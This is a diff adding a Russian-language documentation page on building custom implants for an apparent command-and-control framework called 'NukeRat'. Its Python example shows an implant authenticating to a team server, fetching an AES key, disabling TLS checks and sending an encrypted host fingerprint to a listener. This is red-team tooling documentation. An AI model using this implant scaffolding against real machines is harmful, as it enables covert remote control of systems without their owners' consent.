@@ -1,0 +1,104 @@
+---
+title: Пользовательские импланты
+---
+
+Иногда нужен имплант, собранный с нуля под конкретную задачу. В таких случаях используйте API имплантов NukeRat.
+
+## Как это устроено
+
+Уточним: по умолчанию при HTTP-канале имплант общается с REST API, которым управляет listener. Через этот API он получает команды и отправляет вывод.
+
+Слой связи для своего импланта описан в документации [API имплантов](/docs/rest-api/implants).
+
+## Пример
+
+Ниже — упрощённый пример обращения к API имплантов NukeRat. Исходный образец лежит в репозитории [nukeratframework/api](https://github.com/nukeratframework/api/blob/main/example/implant_example.py).
+
+```python
+import json
+import requests
+import urllib3
+from implant.aes import build_implant_body
+
+operator_key = ''
+aes_key = ''
+team_server_url = 'http://192.168.15.21:9000'
+implant_listener_url = 'http://192.168.15.21:9090'
+listener_response_template = ''
+
+urllib3.disable_warnings()
+
+def implant_example(command):
+    """
+    Example: create an AES key to communicate with the server and then
+    send fingerprinting to the server. This is the process done by the
+    implant, the difference is that the AES key is generated during
+    compile time.
+    """
+    global aes_key
+    user, password, secret = operator_key.split(':', 2)
+    base = team_server_url.rstrip('/')
+    token = requests.post(
+        f'{base}/auth/login',
+        json={'user': user, 'pass': password, 'secret': secret},
+        verify=False,
+    ).json()['access_token']
+
+    headers = {'Authorization': f'Bearer {token}'}
+
+    if not aes_key:
+        aes_key = requests.post(
+            f'{base}/api/aes/create',
+            json={},
+            headers=headers,
+            verify=False,
+        ).json()['aesKey']
+
+    body = build_implant_body(
+        aes_key,
+        {
+            'option': 'new',
+            'tag': 'demo01',
+            'ip': '',
+            'external_ip': '',
+            'hostname': 'fake-fp',
+            'user': 'lab',
+            'arch': 'x64',
+            'pid': 1,
+            'os': 'windows',
+            'listener': 'http',
+            'delay': 2,
+            'notes': command,
+            'implant_config': {
+                'channel': 'http',
+                'host': '127.0.0.1',
+                'port': '9090',
+                'host_tag': 'demo01',
+                'delay': 2,
+            },
+            'metadata': {
+                'relays': [],
+                'privilege': 'default',
+                'internal_ip': '127.0.0.1',
+                'host': '127.0.0.1',
+                'port': '9090',
+            },
+        },
+    )
+    response = requests.post(
+        implant_listener_url.rstrip('/') + '/',
+        data=body,
+        headers={'Content-Type': 'application/octet-stream'},
+        verify=False,
+    )
+
+    return response.status_code
+
+
+if __name__ == '__main__':
+    print(implant_example('probe'))
+```
+
+## Пользовательский канал
+
+Если нужен канал связи, отличный от HTTP по умолчанию, потребуется настройка пользовательского канала. Подробности — в разделе [Пользовательские каналы](/docs/custom-channels).
